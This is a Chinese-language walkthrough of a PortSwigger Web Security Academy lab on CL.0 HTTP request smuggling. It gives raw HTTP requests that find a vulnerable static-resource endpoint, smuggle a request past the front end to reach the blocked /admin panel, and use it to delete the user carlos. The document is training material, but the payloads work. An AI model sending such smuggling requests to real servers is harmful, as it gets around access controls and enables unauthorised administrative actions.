# 实验：CL.0 请求走私

> **LAB** | **PRACTITIONER** | 未解决

本实验容易受到 CL.0 请求走私攻击。后端服务器会忽略对某些端点的请求中的 `Content-Length` 头。

要解决本实验，请识别一个易受攻击的端点，向后端走私一个请求以访问 `/admin` 下的管理面板，然后删除用户 `carlos`。

本实验基于 PortSwigger Research 发现的现实世界漏洞。更多详情，请查看 [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#cl.0)。

## 步骤

探测
- 访问管理端点

    ```http
    GET /admin HTTP/1.1
    Host: 0aa3005c04804dc18288ec8800fa0054.web-security-academy.net
    ```

    - 响应

        ```http
        HTTP/1.1 403 Forbidden
        Content-Type: application/json; charset=utf-8
        Keep-Alive: timeout=10
        Content-Length: 24

        "Path /admin is blocked"
        ```

尝试 CL.0 载荷
- 主页
    ```http
    POST / HTTP/1.1
    Host: 0aa3005c04804dc18288ec8800fa0054.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Connection: keep-alive
    Content-Length: 34

    GET /hopefully404 HTTP/1.1
    Foo: x
    ```
    - 得到普通响应2

- 静态资源端点
    ```http
    POST /resources/images/blog.svg HTTP/1.1
    Host: 0aa3005c04804dc18288ec8800fa0054.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Connection: keep-alive
    Content-Length: 34

    GET /hopefully404 HTTP/1.1
    Foo: x
    ```

    - 响应2
        ```http
        HTTP/1.1 404 Not Found
        Content-Type: text/html; charset=utf-8
        Set-Cookie: session=4JdWH9NBn19ixU8jRzD4MQkKYcknl9wM; Secure; HttpOnly; SameSite=None
        X-Frame-Options: SAMEORIGIN
        Keep-Alive: timeout=10
        Content-Length: 31

        <p>Not Found: /hopefully404</p>
        ```
        - 成功

    
使用 CL-0 攻击，访问管理端点
- 请求1
    ```http
    POST /resources/images/blog.svg HTTP/1.1
    Host: 0aa3005c04804dc18288ec8800fa0054.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Connection: keep-alive
    Content-Length: 27

    GET /admin HTTP/1.1
    Foo: x
    ```

    - 响应2

        ```html
        <div>
            <span>
                carlos -
            </span>
            <a href="/admin/delete?username=carlos">
                Delete
            </a>
        </div>
        ```
        - 成功访问管理端点，并得到删除功能端点

- 请求1设置为新得到的删除功能端点
    - 成功执行
